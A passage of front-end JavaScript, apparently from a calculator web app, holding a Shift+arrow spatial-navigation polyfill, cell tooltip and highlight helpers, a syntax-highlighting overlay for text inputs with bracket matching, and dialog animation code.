  // https://github.com/WICG/spatial-navigation/pull/228/files
  window.__spatialNavigation__.keyMode = "SHIFTARROW";
*/

if (!('navigate' in window)) {

  if (Element.prototype.checkVisibility == null) {
    // IE 11
    Element.prototype.checkVisibility = function () {
      //TODO: fix
      return e.offsetWidth !== 0 || e.offsetHeight !== 0 || e.getClientRects().length !== 0;
    };
  }

  var isVisible = function (element) {
    return element.checkVisibility();
  };
  var directions = {
    37: 'left',
    38: 'top',
    39: 'right',
    40: 'bottom'
  };
  var exitPoint = function (rect, direction) {
    return {
      x: direction === 'left' || direction === 'right' ? rect[direction] : (rect.left + rect.right) / 2,
      y: direction === 'top' || direction === 'bottom' ? rect[direction] : (rect.top + rect.bottom) / 2
    };
  };
  var distance = function(to, from, f) {
    return Math.sqrt(Math.pow((to.x - from.x) * (f ? 2 : 1), 2) + Math.pow((to.y - from.y) * (!f ? 2 : 1), 2));
  };
  var distance1 = function (fromRect, toRect, direction) {
    var f = direction === 'bottom' || direction === 'top';
    var P1 = exitPoint(fromRect, direction);
    var P2 = {
      x: Math.min(Math.max(P1.x, toRect.left), toRect.right),
      y: Math.min(Math.max(P1.y, toRect.top), toRect.bottom)
    };
    return distance(P1, P2, f);
  };
  var handlingEditableElementSmall = function (input, direction) {
    // input.selectionStart == null && input.selectionEnd == null for <input type="number" />
    var tagName = input.tagName.toLowerCase();
    return (tagName !== 'input' && tagName !== 'textarea' && tagName !== 'custom-input') ||
           (input.selectionStart === input.selectionEnd && (input.selectionStart == null || input.selectionStart === (direction === 'left' || direction === 'up' ? 0 : input.value.length)));
  };

  var canMove = function (direction) {
    // The method is based on the Selection#modify
    var selection = window.getSelection();
    var compareCaretPositons = function (node1, offset1, node2, offset2) {
      var tmpRange1 = document.createRange();
      tmpRange1.setStart(node1, offset1);
      var tmpRange2 = document.createRange();
      tmpRange2.setStart(node2, offset2);
      return tmpRange1.compareBoundaryPoints(Range.START_TO_START, tmpRange2);
    };
    var anchorNode = selection.anchorNode;
    var anchorOffset = selection.anchorOffset;
    var focusNode = selection.focusNode;
    var focusOffset = selection.focusOffset;
    var forward = compareCaretPositons(anchorNode, anchorOffset, focusNode, focusOffset) < 0;
    var node = null;
    var offset = 0;
    if (direction === 'backward') {
      node = forward ? anchorNode : focusNode;
      offset = forward ? anchorOffset : focusOffset;
    }
    if (direction === 'forward') {
      node = forward ? focusNode : anchorNode;
      offset = forward ? focusOffset : anchorOffset;
    }
    selection.setBaseAndExtent(node, offset, node, offset);
    selection.modify('move', direction, 'character');
    var result = selection.anchorNode !== node ||
                   selection.anchorOffset !== offset ||
                   selection.focusNode !== node ||
                   selection.focusOffset !== offset;
    selection.setBaseAndExtent(anchorNode, anchorOffset, focusNode, focusOffset);
    return result;
  };

  document.addEventListener('keydown', function(event) {
    if (!event.defaultPrevented && event.shiftKey && !event.ctrlKey && !event.metaKey && !event.altKey) {
      var direction = directions[event.keyCode] || '';
      //TODO: check selectable elements, check "caret browsing state"
      if (direction !== '') {

        //TODO: create issues in the WICG/spatial-navigation :
        if (!window.getSelection().isCollapsed) {
          return;//TODO: issue - ?
        }
        var tagName = event.target.tagName.toLowerCase();
        var isEditable = tagName === 'input' || tagName === 'textarea' || tagName === 'custom-input' || event.target.hasAttribute('contenteditable');
        if (!isEditable && document.activeElement.contains(window.getSelection().focusNode)) {
          if (window.getSelection().type === 'Caret') {
            // no way to detect "Caret Navigation" mode in Chrome :-(, so just use same handlign as for editable elements
            if ((direction === 'left' || direction === 'up' ? canMove('backward') : canMove('forward'))) {
              return; //TODO: issue - ?
            }
          }
        }
        if (!handlingEditableElementSmall(document.activeElement, direction)) {
          return;
        }

        var from = document.activeElement;
        var fromRect = from.getBoundingClientRect();
        var elements = document.getElementsByTagName('*');
        var to = null;
        var toRect = null;
        for (var i = 0; i < elements.length; i++) {
          var element = elements[i];
          if (element.hasAttribute('tabindex') || element.tabIndex !== -1) {
            var rect = element.getBoundingClientRect();
            if (direction === 'bottom' && rect.bottom > fromRect.bottom || direction === 'top' && rect.top < fromRect.top || direction === 'left' && rect.left < fromRect.left || direction === 'right' && rect.right > fromRect.right) {
              if (toRect == null || distance1(fromRect, toRect, direction) > 
                                    distance1(fromRect, rect, direction)) {
                if (isVisible(element)) {
                  to = element;
                  toRect = rect;
                }
              }
            }
          }
        }
        if (to != null) {
          event.preventDefault();
          to.focus();
        }
      }
    }
  }, false);
}

/*global document, Dialog */

(function () {
  "use strict";

  var oldHighlights = undefined;
  var highlight = function (element) {
    if (oldHighlights != undefined) {
      for (var i = 0; i < oldHighlights.length; i += 1) {
        var e = document.getElementById(oldHighlights[i]);
        if (e != undefined) {
          e.style.backgroundColor = '';
          e.style.color = '';
        }
      }
      oldHighlights = undefined;
    }
    if (element != undefined) {
      var highlight = element.getAttribute("data-highlight"); // #id1, #id2, ...
      if (highlight != undefined) {
        var newHighlights = highlight.replace(/[#\s]/g, "").split(",");
        for (var j = 0; j < newHighlights.length; j += 1) {
          var e = document.getElementById(newHighlights[j]);
          if (e != undefined) {
            e.style.backgroundColor = 'antiquewhite';
            e.style.color = '#3C78C2';
          }
        }
        oldHighlights = newHighlights;
      }
    }
  };

  var tooltip = null;

  var keyDownTarget = undefined;

  var onKeyDown = function (event) {
    var DOM_VK_ESCAPE = 27;
    if (event.keyCode === DOM_VK_ESCAPE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
      event.preventDefault();
      showTooltip(undefined);
    }
  };

  var showTooltip = function (element) {
    if (keyDownTarget != undefined) {
      keyDownTarget.removeEventListener("keydown", onKeyDown, false);
      //TODO: should this attribute always point to the description (?)
      keyDownTarget.removeAttribute("aria-describedby");
      keyDownTarget = undefined;
    }
    if (tooltip == null) {
      tooltip = document.createElement("div");
      tooltip.id = "highlight-tooltip";
      tooltip.setAttribute("role", "tooltip");
      tooltip.classList.toggle("tooltip-dialog", true);
    }
    if (tooltip.getAttribute("open") != undefined && element == undefined) {
      tooltip.removeAttribute("open");
    }
    if (element != undefined) {
      var tooltipContainer = element;
      var tooltipId = element.getAttribute("data-tooltip");//TODO: remove
      if (tooltipId != undefined) {
        tooltipContainer = document.getElementById(tooltipId);
      }
        keyDownTarget = document.getElementById(element.getAttribute("data-for"));
        var rect = keyDownTarget.getBoundingClientRect();
        keyDownTarget.setAttribute("aria-describedby", tooltip.id);
        keyDownTarget.addEventListener("keydown", onKeyDown, false);
        if (tooltip.parentNode == undefined) {
          document.body.appendChild(tooltip);
        }
        tooltip.textContent = "";
        var c = tooltipContainer.cloneNode(true);
        while (c.firstChild != undefined) {
          tooltip.appendChild(c.firstChild);
        }
        //tooltip.style.transform = "scale(1)";
        tooltip.style.visibility = "hidden";
        var display = tooltip.style.display;
        tooltip.style.display = "block";
        tooltip.style.position = "absolute";
        tooltip.style.right = "auto"; // Chrome 49 with html[dir="rtl"] uses 0px from right
        tooltip.style.top = (window.pageYOffset + rect.top - tooltip.offsetHeight - 8.5) + 'px';
        tooltip.style.left = (window.pageXOffset + (rect.left + rect.right) / 2 - tooltip.offsetWidth / 2) + "px";
        tooltip.style.bottom = "auto";
        tooltip.style.display = display;
        tooltip.style.visibility = "";
        //tooltip.style.transform = "";
        if (tooltip.getAttribute("open") == undefined) {
          tooltip.setAttribute("open", "open"); // "show" moves the focus in Chrome
        }
    }
  };

  var f = function (highlight) {

    var hoveredElements = [];
    var focusedElements = [];

    return function (element) {
      var x = document.getElementById(element.getAttribute("data-for"));

      //!
      // The idea is to set tabindex="0" only for cells which have a tooltip or a "highlight"
      x.setAttribute("tabindex", "0");
      var tagName = x.tagName.toLowerCase();
      if (tagName === 'mrow' || tagName === 'mtd') {
        if (x.tabIndex == null) {
          x.setAttribute("href", "#");
        }
      } else {
        if (tagName !== 'a' && tagName !== 'span') {//TODO: <a> is deprecated
          throw new RangeError(tagName);
        }
      }
      //!

      var highlightInternal = function () {
        window.setTimeout(function () {
        highlight(hoveredElements.length !== 0 ? hoveredElements[hoveredElements.length - 1] : (focusedElements.length !== 0 ? focusedElements[focusedElements.length - 1] : undefined));
        }, 0);
      };

      x.addEventListener("mouseenter", function (event) {
        hoveredElements.push(element);
        highlightInternal();
      }, false);
      x.addEventListener("mouseleave", function (event) {
        hoveredElements.pop();
        highlightInternal();
      }, false);
      x.addEventListener("focus", function (event) {
        focusedElements.push(element);
        highlightInternal();
      }, false);
      x.addEventListener("blur", function (event) {
        focusedElements.pop();
        highlightInternal();
      }, false);
    };

  };

  globalThis.initializeAHighlight = f(highlight);
  globalThis.initializeATooltip = f(showTooltip);

}());

/*global window, document, console, Node, Event*/

//TODO: optimize

(function () {
  "use strict";

  var selectionChangeEventSupportOnDocument = undefined;
  var isSelectionChangeEventSupportedOnDocument = function (node) {
    if (!('onselectionchange' in document)) {
      return false;
    }
    if (node.hasAttribute('contenteditable')) {
      return true;
    }
    if (selectionChangeEventSupportOnDocument == null) {
      var div = document.createElement('div');
      var input = document.createElement('input');
      div.appendChild(input);
      document.body.appendChild(div);
      input.value = 'x';
      input.select();
      var selection = window.getSelection();
      selectionChangeEventSupportOnDocument = selection.anchorOffset === selection.focusOffset &&
                                    selection.anchorNode === div &&
                                    selection.focusNode === div;
      div.parentNode.removeChild(div);
    }
    return selectionChangeEventSupportOnDocument;
  };

  var polyfillSelectionChangeEventOnEditableElements = function () {
    var lastSelection = {
      anchorNode: null,
      focusNode: null
    };
    var fire = function (node) {
      if (node != null) {
        if (node.nodeType === Node.TEXT_NODE) {
          node = node.parentNode;
        }
        if (node != null) {
          node.dispatchEvent(new Event('selectionchange'));
        }
      }
    };
    var f = function (a, b) {
      if (a !== b) {
        fire(a);
        fire(b);
      } else {
        fire(a);
      }
    };
    var getContainer = function (container, offset) {
      if (container == null) {
        return null;
      }
      var c = container.firstChild;
      var i = 0;
      while (c != null && i < offset) {
        i += 1;
        c = c.nextSibling;
      }
      if (c != null && c.nodeType === Node.ELEMENT_NODE && (c.tagName.toLowerCase() === 'input' || c.tagName.toLowerCase() === 'textarea')) {
        return c;
      }
      return container;
    };
    document.addEventListener('selectionchange', function (event) {
      var selection = window.getSelection();
      var anchorNode = getContainer(selection.anchorNode, selection.anchorOffset);
      var focusNode = getContainer(selection.focusNode, selection.focusOffset);
      if (lastSelection.anchorNode === lastSelection.focusNode && anchorNode === focusNode) {
        f(lastSelection.anchorNode, anchorNode);
      } else {
        f(lastSelection.anchorNode, anchorNode);
        f(lastSelection.focusNode, focusNode);
      }
      lastSelection.anchorNode = anchorNode;
      lastSelection.focusNode = focusNode;
    }, false);
  };

  polyfillSelectionChangeEventOnEditableElements();
  var listenForSelectionChange = function (input, f) {
    //TODO:
    // https://github.com/w3c/selection-api/issues/53
    // selectionchange
    // UPDATE: https://bugs.chromium.org/p/chromium/issues/detail?id=1327098&q=selectionchange&can=2
    // new selectionchange should be fired at <input>

    if (!isSelectionChangeEventSupportedOnDocument(input)) {
      // wheel : Shift + mousewheel
      // dragover : https://stackoverflow.com/questions/27713057/event-to-detect-when-the-text-in-an-input-is-scrolled
      var events = ['keydown', 'keyup', 'mousedown', 'mouseup', 'mousemove', 'touchmove', 'input', 'focus', 'blur', 'wheel', 'dragover'];
      for (var i = 0; i < events.length; i += 1) {
        input.addEventListener(events[i], f, events[i] === 'wheel' || events[i] === 'touchmove' ? {passive: true} : false);
      }
    }
  };

  function toggleEnabled(container, hasFocus) {
    // recalculate style only on the elements, not on all page elements
    container.classList.toggle('enabled', hasFocus && container.querySelector('input[type="number"]') == null);//!
  }

var queue = [];
var initializeAInput = function (container) {
  var input = container.firstElementChild;
  if (input.tagName.toLowerCase() !== 'input' &&
      input.tagName.toLowerCase() !== 'textarea' &&
      !input.hasAttribute('contenteditable')) {
    throw new TypeError();
  }
  var idPrefix = input.id + '=';

  // see https://github.com/kueblc/LDT

  var inputStyle = window.getComputedStyle(input, undefined);

  // FF does not like font
  var fontSize = inputStyle.fontSize;
  var fontFamily = inputStyle.fontFamily;
  var fontWeight = inputStyle.fontWeight;
  var lineHeight = inputStyle.lineHeight;
  var textAlign = inputStyle.textAlign;

  var marginLeft = Number.parseFloat(inputStyle.marginLeft);
  var marginTop = Number.parseFloat(inputStyle.marginTop);
  var marginRight = Number.parseFloat(inputStyle.marginRight);
  var marginBottom = Number.parseFloat(inputStyle.marginBottom);

  var paddingLeft = Number.parseFloat(inputStyle.paddingLeft);
  var paddingTop = Number.parseFloat(inputStyle.paddingTop);
  var paddingRight = Number.parseFloat(inputStyle.paddingRight);
  var paddingBottom = Number.parseFloat(inputStyle.paddingBottom);

  // when the width of a textarea is small, paddingRight will not be included in scrolling area,
  // but this is not true for an input, in Firefox - for both
  // see https://developer.mozilla.org/en-US/docs/Mozilla/Gecko/Chrome/CSS/overflow-clip-box
  if (input.tagName.toLowerCase() === "input") {
    // Firefox, Edge, Chrome
    marginLeft += paddingLeft;
    marginTop += paddingTop;
    marginRight += paddingRight;
    marginBottom += paddingBottom;
    paddingLeft = 0;
    paddingTop = 0;
    paddingRight = 0;
    paddingBottom = 0;
  } else {
    if (paddingRight !== 0 || paddingBottom !== 0) {
      console.warn("Set paddingRight and paddingBottom to zero for <textarea> elements");
    }
  }

  var backgroundElement = document.createElement("div");
  backgroundElement.style.fontSize = fontSize;
  backgroundElement.style.fontFamily = fontFamily;
  backgroundElement.style.fontWeight = fontWeight;
  backgroundElement.style.lineHeight = lineHeight;
  backgroundElement.style.textAlign = textAlign;
  backgroundElement.style.paddingLeft = paddingLeft + "px";
  backgroundElement.style.paddingTop = paddingTop + "px";
  backgroundElement.style.paddingRight = paddingRight + "px";
  backgroundElement.style.paddingBottom = paddingBottom + "px";
  backgroundElement.setAttribute('translate', 'no'); // for Google Translate
  backgroundElement.setAttribute('inert', 'inert');
  if (queue.length === 0) {
    window.requestAnimationFrame(function () {
      for (var i = 0; i < queue.length; i += 1) {
        queue[i]();
      }
      queue.length = 0;
    });
  }
  queue.push(function () { // relayout
    input.parentNode.insertBefore(backgroundElement, input);
  });

  var updateTokenNode = function (span, text, tokenClassName) {
    var classList = span.classList;
    for (var i = 0; i < classList.length; i += 1) {
      var c = classList[i];
      if (c !== tokenClassName &&
          c !== "bad-brace-colour" &&
          c !== "brace-highlight-style" &&
          c !== "error-mark" &&
          c !== "smart-highlighting") {
        classList.toggle(classList[i], false);
      }
    }
    if (tokenClassName != null) {
      span.classList.toggle(tokenClassName, true);
    }
    if (span.firstChild == null || text === "") {
      throw new TypeError("Something happens with undo/redo history in Chrome when text node is added/removed.");
    }
    if (span.firstChild.data !== text) {
      span.firstChild.data = text; //Note: on the TextNode
    }
  };

  var add = function (text, tokenClassName, className, div) {
    var span = document.createElement("span");
    span.textContent = " ";
    updateTokenNode(span, text, tokenClassName, className);
    div.appendChild(span);
  };

  var getBracketMarks = function (value, inputSelectionStart) {
    if (inputSelectionStart == null) {
      return [];
    }
    var selectionStart = Math.max(inputSelectionStart - 1, 0);
    var c = 0;
    var step = 0;
    var pair = 0;
    while (step === 0 && selectionStart < Math.min(inputSelectionStart + 1, value.length)) {
      c = value.charCodeAt(selectionStart);
      var brackets = "()[]{}〖〗（）";
      for (var k = 0; k < brackets.length; k += 2) {
        if (c === brackets.charCodeAt(k)) {
          pair = brackets.charCodeAt(k + 1);
          step = +1;
        }
        if (c === brackets.charCodeAt(k + 1)) {
          pair = brackets.charCodeAt(k);
          step = -1;
        }
      }
      selectionStart += 1;
    }
    selectionStart -= 1;
    if (step !== 0) {
      var i = selectionStart;
      var depth = 1;
      i += step;
      while (i >= 0 && i < value.length && depth > 0) {
        var code = value.charCodeAt(i);
        if (code === c) {
          depth += 1;
        }
        if (code === pair) {
          depth -= 1;
        }
        i += step;
      }
      i -= step;
      if (depth === 0) {
        return [
          {start: selectionStart, end: selectionStart + 1, className: "brace-highlight-style"},
          {start: i, end: i + 1, className: "brace-highlight-style"}
        ];
      } else {
        return [{start: selectionStart, end: selectionStart + 1, className: "bad-brace-colour"}];
      }
    }
    return [];
  };

  var oldMargins = [-0, -0, -0, -0]
  var updateMargins = function () {
    // ! Element#clientLeft and Element#clientTop are rounded to integers:
    var clientLeft = input.tagName.toLowerCase() === "input" ? Number.parseFloat(inputStyle.borderLeftWidth) : input.clientLeft;
    var clientTop = input.tagName.toLowerCase() === "input" ? Number.parseFloat(inputStyle.borderTopWidth) : input.clientTop;
    //var inputRect = input.getBoundingClientRect();
    var clientRight = input.offsetWidth - input.clientWidth - clientLeft;
    var clientBottom = input.offsetHeight - input.clientHeight - clientTop;
    
    if (oldMargins[0] !== clientLeft + marginLeft ||
        oldMargins[1] !== clientTop + marginTop ||
        oldMargins[2] !== clientRight + marginRight ||
        oldMargins[3] !== clientBottom + marginBottom) {
      oldMargins[0] = clientLeft + marginLeft;
      oldMargins[1] = clientTop + marginTop;
      oldMargins[2] = clientRight + marginRight;
      oldMargins[3] = clientBottom + marginBottom;
      backgroundElement.style.marginLeft = (clientLeft + marginLeft).toString() + "px";
      backgroundElement.style.marginTop = (clientTop + marginTop).toString() + "px";
      backgroundElement.style.marginRight = (clientRight + marginRight).toString() + "px";
      backgroundElement.style.marginBottom = (clientBottom + marginBottom).toString() + "px";
    }
  };

  var updateDirectionality = function () {
    var dir = input.getAttribute('dir') || 'ltr';
    if (backgroundElement.getAttribute('dir') !== dir) { // avoid layout invalidation in Chrome
      backgroundElement.setAttribute('dir', dir);
    }
  };

  // TODO: start, end, insertion
  var updateLine = function (line, lineNode) {
    //TODO: there can be delay, so should it be moved to the current script instead (?)
    
    var quickUpdate = true;
    if (quickUpdate) {
      var tokenNode = lineNode.firstElementChild;
      var i = 0;
      while (tokenNode != null && line.startsWith(tokenNode.firstChild.data, i)) {
        i += tokenNode.firstChild.data.length;
        tokenNode = tokenNode.nextElementSibling;
      }
      if (tokenNode == null) {
        if (lineNode.lastElementChild == null) {
          tokenNode = document.createElement('span');
          tokenNode.textContent = line;
          lineNode.appendChild(tokenNode);
        } else {
          lineNode.lastElementChild.firstChild.data = line.slice(i - lineNode.lastElementChild.firstChild.data.length);
        }
      } else if (tokenNode) {
        tokenNode.firstChild.data = line.slice(i);
        tokenNode = tokenNode.nextElementSibling;
        while (tokenNode != null) {
          var next = tokenNode.nextElementSibling;
          tokenNode.parentNode.removeChild(tokenNode);
          tokenNode = next;
        }
      }
    }

  RPNProxy.getTokens(line).then(function (tokens) {
    //lineNode.textContent = '';
    var tokenNode = lineNode.firstElementChild;
    var position = 0;
    for (var j = 0; j < tokens.length; j += 1) {
      var token = tokens[j];
      if (tokenNode == null) {
        tokenNode = document.createElement('span');
        tokenNode.textContent = ' ';
        lineNode.appendChild(tokenNode);
      }
      //TODO: move ?
      var type = token.type === 'symbol' && /^pi|[eiEIUnkXY]$/.test(token.value) ? 'special-symbol' : token.type;
      var tokenText = line.slice(position, token.position); // token.value contains replaced characters and even the token.value can have a different length
      updateTokenNode(tokenNode, tokenText, type);
      position = token.position;
      tokenNode = tokenNode.nextElementSibling;
    }
    while (tokenNode != null) {
      var next = tokenNode.nextElementSibling;
      tokenNode.parentNode.removeChild(tokenNode);
      tokenNode = next;
    }
    //TODO: EOF?

/*
    var start = 0;
    var end = line.length;

    for (var i = 0; i < marks.length; i += 1) {
      var m = marks[i];
      var s = m.start > start ? m.start : start;
      var e = m.end < end ? m.end : end;
      if (s < e) {
        add(line.slice(start, s), null, null, lineNode);
        add(line.slice(s, e), null, m.className, lineNode);
        start = e;
      }
    }
    if (start < end) {
      add(line.slice(start, end), null, null, lineNode);
      start = end;
    }
*/
    if (input.getAttribute("list") != undefined && textAlign !== 'center') {
      add("  ", null, null, lineNode); // to increase scrollWidth in Chrome
    }

    //?
    updateMarks();
  });
  };

  var map = {};
  var idCounter = -1;

  var getCursorPosition = function (input) {
    var isFocusWithin = document.activeElement === input;
    if (!isFocusWithin) {
      return null;
    }
    try {
      return input.selectionDirection !== 'forward' ? input.selectionStart : input.selectionEnd;
    } catch (error) {
      // input.type === 'number' on some browsers
      // Firefox 3.6.28 throws when trying to get selectionStart/selectionEnd on invisible element (textarea/input)
      // Not sure if it is fast to check visibility using "input.getBoundingClientRect().left === 0".
      console.error(error);
      return null;
    }
  };

  var getCursorSecondPosition = function (input) {
    var isFocusWithin = document.activeElement === input;
    if (!isFocusWithin) {
      return null;
    }
    try {
      return input.selectionDirection === 'forward' ? input.selectionStart : input.selectionEnd;
    } catch (error) {
      // input.type === 'number' on some browsers
      console.error(error);
      return null;
    }
  };
  
  var oldMarks = [];
  var oldNodes = [];
  var updateMarks = function () {
    var marks = [];
    var tmp0 = getBracketMarks(input.value, getCursorPosition(input));
    for (var i = 0; i < tmp0.length; i += 1) {
      marks.push(tmp0[i]);
    }
    var error = input.getAttribute("data-error");
    if (error != undefined) {
      marks.push({start: Number(error.split(",")[0]), end: Number(error.split(",")[1]), className: "error-mark"});
    }
    marks.sort(function (a, b) {
      return a.start < b.start ? -1 : (b.start < a.start ? +1 : 0);
    });

    if (JSON.stringify(marks) !== JSON.stringify(oldMarks)) {
      oldMarks = marks;
      
      /*var className = null;
      for (var i = 0; i < marks.length; i += 1) {
        var m = marks[i];
        if (m.start >= position && m.end <= token.position) {
          className = m.className;
        }
      }*/

      for (var i = 0; i < oldNodes.length; i += 1) {
        oldNodes[i].node.classList.toggle(oldNodes[i].className);
      }
      oldNodes.length = 0;
      for (var i = 0; i < marks.length; i += 1) {
        var m = marks[i];
        var tokenNode = getTokenNode(m.start, m.end);
        if (tokenNode != null) {
          tokenNode.classList.toggle(m.className, true);
          oldNodes.push({node: tokenNode, className: m.className});
        }
      }
    }
  };

  var updateValue = function (value) {
    var lines = value.split('\n');
    var start = 0;
    var node = backgroundElement.firstElementChild;
    for (var j = 0; j < lines.length; j += 1) {
      if (node == null) {
        node = document.createElement("div");
        node.id = idPrefix + (++idCounter);
        map[node.id] = {line: null};
        backgroundElement.appendChild(node);
      }
      var div = node;
      var line = lines[j];
      var data = map[div.id];
      if (line !== data.line) {
        //Note: empty lines are collapsed
        //Note: extra whitespace/newline may work not well with text-align inequal to 'start'
        updateLine(line || ' ', div);
        data.line = line;
      }
      start += line.length + '\n'.length;
      node = node.nextElementSibling;
    }
    while (node != undefined) {
      var next = node.nextElementSibling;
      delete map[node.id];
      node.parentNode.removeChild(node);
      node = next;
    }
  };

  var update = function (event) {
    updateMargins();
    updateDirectionality();
    updateValue(input.value);
  };

  var getTokenNode = function (start, end) {
    var result = null;
    var lineNode = backgroundElement.firstElementChild;
    var lineStart = 0;
    while (lineNode != null) {
      var data = map[lineNode.id];
      var line = data.line;
      var s = Math.min(start - lineStart, line.length);
      var e = Math.min(end - lineStart, line.length);
      if (s < e) {
        var tokenNode = lineNode.firstElementChild;
        while (tokenNode != null) {
          var n = tokenNode.firstChild.data.length;
          if (s === 0 && e === n) {
            result = tokenNode;
          }
          s -= n;
          e -= n;
          tokenNode = tokenNode.nextElementSibling;
        }
      }
      lineStart += line.length + '\n'.length;
      lineNode = lineNode.nextElementSibling;
    }
    return result;
  };

  var wasSelected = false;
  // if selection contains exactly one token and it is not a punctuation or operator select all other similar tokens
  var updateSmartHighlighting = function (start, end) {
    if (start > end) {
      var tmp = start;
      start = end;
      end = tmp;
    }
    if (end - start >= 1 || wasSelected) {
      var selectedToken = getTokenNode(start, end);
      if (wasSelected || selectedToken != null) {
        var selectionText = selectedToken != null && (!selectedToken.classList.contains('whitespace')) ? selectedToken.firstChild.data : null;
        var lineNode = backgroundElement.firstElementChild;
        var selectedNodes = 0;
        while (lineNode != null) {
          var tokenNode = lineNode.firstElementChild;
          while (tokenNode != null) {
            var ok = tokenNode.firstChild.data === selectionText;
            tokenNode.classList.toggle("smart-highlighting", ok);
            selectedNodes += (ok ? 1 : 0);
            tokenNode = tokenNode.nextElementSibling;
          }
          lineNode = lineNode.nextElementSibling;
        }
        wasSelected = selectedNodes !== 0;
      }
    }
  };

  var oldCursorPosition = null;
  var oldCursorSecondPosition = null;
  var ticking = false;
  var checkSelectionChange = function (event) {
    if (!ticking) {
      ticking = true;
      window.requestAnimationFrame(function () { // selectionStart is not changed yet for mousedown event
        ticking = false;
        var newCursorPosition = getCursorPosition(input);
        var newCursorSecondPosition = getCursorSecondPosition(input);
        if (oldCursorPosition !== newCursorPosition) {
          updateMarks();
        }
        if (oldCursorPosition !== newCursorPosition ||
            oldCursorSecondPosition !== newCursorSecondPosition) {
          updateSmartHighlighting(newCursorPosition, newCursorSecondPosition);
        }
        oldCursorPosition = newCursorPosition;
        oldCursorSecondPosition = newCursorSecondPosition;
      });
    }
  };

  input.addEventListener("selectionchange", checkSelectionChange, false);
  listenForSelectionChange(input, checkSelectionChange);

  input.addEventListener("input", update, false);

  input.addEventListener("update-attribute", function (event) {
    updateMarks();
  }, false);

  var scrollUpdateTicking = false;
  var onScroll = function (event) {
    if (!scrollUpdateTicking) {
      scrollUpdateTicking = true;
      window.requestAnimationFrame(function () {
        scrollUpdateTicking = false;
        //window.requestAnimationFrame(function () {//?
        //});
        var scrollLeft = input.scrollLeft;
        var scrollTop = input.scrollTop;
        // avoid strange style recalcuation which stops the smooth scrolling animation (element.scrollIntoViewIfNeeded(false))
        if (backgroundElement.scrollLeft !== scrollLeft) {
          backgroundElement.scrollLeft = scrollLeft;
        }
        if (backgroundElement.scrollTop !== scrollTop) {
          backgroundElement.scrollTop = scrollTop;
        }
      });
    }
  };

  input.addEventListener("scroll", onScroll, false);
  input.addEventListener("selectionchange", onScroll, false);//TODO: remove (?)

  var onFocusOrBlur = function (event) {
    checkSelectionChange();
  };
  input.addEventListener("focus", onFocusOrBlur, false);
  input.addEventListener("blur", onFocusOrBlur, false);

  var hasFocus = document.hasFocus();
  toggleEnabled(container, hasFocus);

  //container.setAttribute('lang', ''); - cause relayout in Chrome? - moved to outer function

  update(undefined);
};

  var onFocusOrBlur = function (event) {
    var hasFocus = document.hasFocus();
    var es = document.querySelectorAll('.a-input'); // faster then document.getElementsByClassName('a-input') because of DOM modifications (?)
    for (var i = 0; i < es.length; i += 1) {
      toggleEnabled(es[i], hasFocus);
    }
  };
  window.addEventListener("focus", onFocusOrBlur, false);
  window.addEventListener("blur", onFocusOrBlur, false);

  window.initializeAInput = initializeAInput;

}());

/*global document, window */

(function () {
  "use strict";

  var ANIMATION_DURATION = 120;

  var animateOnClose = function (dialog) {
    dialog.style.display = "";
    if (dialog.animate != undefined) {
      dialog.style.display = "block";
      dialog.style.opacity = "0";
      dialog.style.transform = "scale(0.75)";
      dialog.animate([
        {transform: "scale(1.3333333333333333)", opacity: "1"},
        {transform: "scale(1)", opacity: "0"}
      ], {
        duration: ANIMATION_DURATION,
        composite: "add"
      });
      window.setTimeout(function () {
        dialog.style.display = "";
      }, ANIMATION_DURATION);
    }
    var backdrop = dialog.nextElementSibling;
    if (backdrop != undefined && backdrop.matches('.backdrop')) {
      if (backdrop.animate != undefined) {
        backdrop.style.opacity = "0";
        backdrop.animate([
          {opacity: "1"},
          {opacity: "0"}
        ], {
          duration: ANIMATION_DURATION,
          composite: "add"
        });
      }
    }
  };

  var animateOnShow = function (dialog) {
    dialog.style.display = "block"; // set display to "block" to play animation on closing later
    if (dialog.animate != undefined) {
      dialog.style.opacity = "1";
      dialog.style.transform = "scale(1)";
      dialog.animate([
        {transform: "scale(0.75)", opacity: "-1"},
        {transform: "scale(1)", opacity: "0"}
      ], {
        duration: ANIMATION_DURATION,
        composite: "add"
      });
    }
    var backdrop = dialog.nextElementSibling;
    if (backdrop != undefined && backdrop.matches('.backdrop')) {
      if (backdrop.animate != undefined) {
        backdrop.style.opacity = "1";
        backdrop.animate([
          {opacity: "-1"},
          {opacity: "0"}
        ], {
          duration: ANIMATION_DURATION,
          composite: "add"
        });
      }
    }
  };

if (window.MutationObserver != null) {
  var onDOMReady = function (event) {
    // with "animationstart" there is some flickering...
    // ... trying to use MutationObserver
    var observer = new MutationObserver(function (mutationList) {
      for (var i = 0; i < mutationList.length; i += 1) {
        var mutation = mutationList[i];
        var target = mutation.target;
        if (target.tagName.toLowerCase() !== "details") {//TODO: ?
          if (target.getAttribute("open") != null) {
            animateOnShow(target);
          } else {
            animateOnClose(target);
          }
        }
      }
    });
    observer.observe(document.body, {
      attributes: true,
      attributeFilter: ["open"],
      subtree: true
    });
  };
  if (document.readyState === "interactive" || document.readyState === "complete") {
    window.setTimeout(function () {
      onDOMReady(null);
    }, 0);
  } else {
    document.addEventListener("DOMContentLoaded", onDOMReady, {once: true});
  }
}

  function Dialog() {
  }

  var idCounter = 0;
  // "Cancel", "OK", "Close"
  // for use as a modal dialog
  Dialog.standard = function (contentHTML, buttonsHTML) {
    var dialog = document.createElement("dialog");
    if (dialog.initDialog != null) {
      dialog.initDialog();
    }
    var contentId = "dialog-content";
    dialog.classList.toggle("standard-dialog", true);
    dialog.setAttribute("aria-describedby", contentId);
    //?
    dialog.innerHTML = "<form method=\"dialog\">" +
                       "<button type=\"submit\" class=\"close\" aria-label=\"" + i18n.misc.close + "\">🗙</button>" +
                       "<div id=\"" + contentId + "\" class=\"content\">" + contentHTML + "</div>" +
                       "<div class=\"buttons\">" + buttonsHTML + "</div>" +
                       "</form>";
    var backdrop = document.createElement("div");
    backdrop.classList.toggle("backdrop", true);
    dialog.addEventListener("close", function (event) {
      window.setTimeout(function () {
        dialog.parentNode.removeChild(dialog);
        backdrop.parentNode.removeChild(backdrop);
      }, Math.max(600, ANIMATION_DURATION));
    }, false);
    var lastActiveElement = document.activeElement;
    dialog.addEventListener("close", function (event) {
      if (lastActiveElement != null) {
        lastActiveElement.focus();
      }
    }, false);
    var rect = document.activeElement != null ? document.activeElement.getBoundingClientRect() : null;
    document.body.appendChild(dialog);
    document.body.appendChild(backdrop);
    if (document.activeElement != null) {
      dialog.style.visibility = "hidden";
